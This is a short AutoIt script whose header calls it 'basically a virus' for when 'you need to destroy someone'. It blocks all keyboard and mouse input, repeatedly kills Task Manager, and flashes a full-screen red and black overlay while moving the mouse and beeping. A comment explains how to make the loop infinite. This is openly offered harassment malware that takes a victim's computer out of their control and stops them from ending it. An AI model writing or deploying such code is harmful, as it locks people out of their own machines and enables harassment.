#cs ############################################################################
 AutoIt Version: 3.3.8.1
 Author:         squ1r3ll
 Script Function:
    To make weird things happen if you need to destroy someone
	It's basically a virus...
#ce ############################################################################
#include <GUIConstantsEx.au3>

$loop = 0
$x = 1

WinMinimizeAll() ; minimize all other windows
GUICreate("LOL PWN TIME", 4000, 4000) ; create the GUI overlay for the screen
BlockInput(1) ; block all user input

while $loop < 200 ;controls how many times the screen flashes along with line 26
   ProcessClose("taskmgr.exe")
   GUISetState(@SW_SHOW) ;show the GUI
   GUISetBkColor(0xFF0000) ;set the colour to black
   MouseMove($loop, $loop + 1)
   GUISetBkColor(0x000000) ;set the colour to red
   For $x = 300 to 3000 step 300
	  Beep($x,1) ;make the weird beeping noise
   Next
   $loop = $loop + 1 ;comment this line out for an infinite loop
wend

; close all .exe's launched within the reign of destruction!
ProcessClose("cdtray.exe")